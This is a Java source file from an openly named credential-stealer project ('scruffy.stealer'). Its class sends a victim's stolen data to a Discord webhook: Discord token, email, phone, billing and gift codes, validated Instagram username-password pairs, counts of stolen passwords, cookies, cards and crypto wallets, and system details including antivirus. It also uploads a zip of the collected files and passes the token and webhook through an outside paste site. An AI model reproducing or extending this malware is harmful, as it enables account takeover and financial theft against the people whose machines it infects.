package scruffy.stealer.file;

import java.awt.Color;
import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;
import java.util.Random;
import java.util.stream.Collectors;

import club.minnced.discord.webhook.WebhookClient;
import club.minnced.discord.webhook.send.WebhookEmbed.EmbedField;
import club.minnced.discord.webhook.send.WebhookEmbed.EmbedFooter;
import club.minnced.discord.webhook.send.WebhookEmbed.EmbedTitle;
import club.minnced.discord.webhook.send.WebhookEmbedBuilder;
import scruffy.stealer.impl.app.discord;
import scruffy.stealer.impl.coin.wallet;
import scruffy.stealer.utils.utilities;
import scruffy.stealer.utils.decrypt.decrypt_manager;

public class file_send extends utilities {

	private static final String WEBHOOK_URL = "";

	public void initialize() {
		try {
			List<String> systemInfos = Arrays.asList(
					"Antivirus: " + getAntivirus(), 
					"Version: " + getWindowsVersion(),
					"CPU: " + getCPU(), 
					"GPU: " + getGPU());
			
			List<String> stealInfos = Arrays.asList(
					"∟ Passwords: " + decrypt_manager.passwordsCount,
					"∟ Autofills: " + decrypt_manager.autoFillsCount, 
					"∟ Cookies: " + decrypt_manager.cookiesCount, 
					"∟ Cards: " + decrypt_manager.cardsCount, 
					"∟ Wallets: " + wallet.stealWallets);

			systemInfos.sort(Comparator.comparingInt(String::length).reversed());
			stealInfos.sort(Comparator.comparingInt(String::length).reversed());

			WebhookClient client = WebhookClient.withUrl(WEBHOOK_URL);
			WebhookEmbedBuilder embedBuilder = new WebhookEmbedBuilder();

			embedBuilder.setTitle(new EmbedTitle(String.format("<a:IconDownloadingUpdate:758414070432137217> %s (%s)", System.getProperty("user.name"), System.getenv("computername")), uploadFile(new File(getPath() + ".zip").getAbsolutePath())));

			if (!discord.check) {
				embedBuilder.setThumbnailUrl("https://cdn.discordapp.com/avatars/" + discord.id + "/" + discord.avatar + ".webp").addField(new EmbedField(true, "<a:pinkcrown:996004209667346442> Token", "[**Click to Copy**](https://paste-pgpj.onrender.com/?p=" + discord.token + ")"));
				embedBuilder.addField(new EmbedField(true, "<a:AltemStar:758414077176446976> User", String.format("**`%s#%s`**", discord.username, discord.discriminator)));
				embedBuilder.addField(new EmbedField(true, "<a:rainbowheart:996004226092245072> Email", "**`" + discord.email + "`**"));
				embedBuilder.addField(new EmbedField(true, "<:starxglow:996004217699434496> Phone", "**`" + discord.phone + "`**"));
				embedBuilder.addField(new EmbedField(true, "<a:boost:824036778570416129> Nitro", "**`" + ((discord.premium_type != 2) ? discord.nitroType : (discord.nitroType + " (" + getBoostMonth(discord.date) + " Months)")) + "`**"));
				embedBuilder.addField(new EmbedField(true, "<a:shard3:815336991850758185> Billing", discord.cardemogies));
				embedBuilder.addField(new EmbedField(true, "<:1079425780272070747:1081519229129478214> Badges", getBadges(discord.flag, true)));

				if (!discord.owner_servers.isEmpty()) {
					Collections.sort(discord.owner_servers, Comparator.comparingInt(String::length).reversed());

					embedBuilder.addField(new EmbedField(false, "<a:earthpink:996004236531859588> HQ Guilds", "\u200b\n" + discord.owner_servers.toString().replace(", ", "\n").substring(1, discord.owner_servers.toString().replace(", ", "\n").length() - 1)));
				}

				if (!discord.gifts.isEmpty()) {
					Collections.sort(discord.gifts, Comparator.comparingInt(String::length).reversed());
					
					embedBuilder.addField(new EmbedField(false, "<a:gift:1021608479808569435> Gift Codes", "\u200b\n" + discord.gifts.toString().replace(", ", "\n\n").replace("[", "").replace("]", "")));
				}
			}

			List<String> instagramAccounts = new ArrayList<>();
			
			decrypt_manager.instagram_accounts.forEach(account -> {
				String[] parts = account.split(":");
				String username = parts[0];
				String password = parts[1];
				if (getCheck(username, password)) {
					String info = getInfo(username, password);
					if (!instagramAccounts.contains(info)) {
						instagramAccounts.add(info);
					}
				}
			});

			if (!instagramAccounts.isEmpty() && !instagramAccounts.toString().contains("null")) {
				embedBuilder.addField(new EmbedField(false, "<a:insta:750058044754493441> Instagram", "\u200b\n" + String.join("\n", instagramAccounts) + "\u200b\n"));
			}

			embedBuilder.addField(new EmbedField(false, ":file_folder: contents", "\u200b**`" + String.join(", ", content.stream().distinct().collect(Collectors.toList())) + "`**"));
			embedBuilder.addField(new EmbedField(true, ":computer: System Infos", "\n**```" + systemInfos.toString().replace("[", "").replace("]", "").replace(", ", "\n") + "```**"));
			embedBuilder.addField(new EmbedField(true, ":closed_lock_with_key: Steal Infos", "\n**```" + stealInfos.toString().replace("[", "").replace("]", "").replace(", ", "\n") + "```**"));
			embedBuilder.addField(new EmbedField(false, "🔰 for devs\u200b", "[**" + getJarName() + "**](https://paste-pgpj.onrender.com/?p=" + WEBHOOK_URL + ")"));

			embedBuilder.setFooter(new EmbedFooter("github.com/itzgonza", ""));
			embedBuilder.setColor(new Color(new Random().nextInt(256), new Random().nextInt(256), new Random().nextInt(256)).getRGB());

			client.send(embedBuilder.build());
			client.close();
		} catch (Exception ignored) {
		}
	}

}